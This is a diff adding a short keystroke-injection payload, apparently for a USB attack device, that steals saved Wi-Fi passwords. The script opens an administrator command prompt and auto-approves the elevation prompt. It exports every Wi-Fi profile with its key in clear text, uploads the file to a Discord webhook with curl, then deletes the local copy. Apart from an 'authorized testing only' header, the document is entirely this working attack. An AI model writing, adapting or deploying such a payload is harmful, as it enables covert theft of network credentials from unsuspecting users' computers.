@@ -1,0 +1,19 @@
+REM ============================================
+REM Wi-Fi Password Extractor -> Discord Webhook
+REM FOR AUTHORIZED PENETRATION TESTING ONLY
+REM ============================================
+REM Replace YOUR_DISCORD_WEBHOOK_URL with your webhook
+REM Or use config.bat for local deployment
+
+DELAY 1000
+GUI r
+DELAY 300
+STRING cmd
+DELAY 200
+CTRL-SHIFT ENTER
+DELAY 800
+ALT y
+DELAY 500
+
+STRING netsh wlan show profile > %TEMP%\wifi.txt && echo ============== >> %TEMP%\wifi.txt && for /f "tokens=2 delims=:" %a in ('netsh wlan show profile ^| findstr /C:"All User Profile"') do (netsh wlan show profile name=%a key=clear >> %TEMP%\wifi.txt 2>&1) && curl.exe -s -F "file=@%TEMP%\wifi.txt" "YOUR_DISCORD_WEBHOOK_URL" && del %TEMP%\wifi.txt
+ENTER
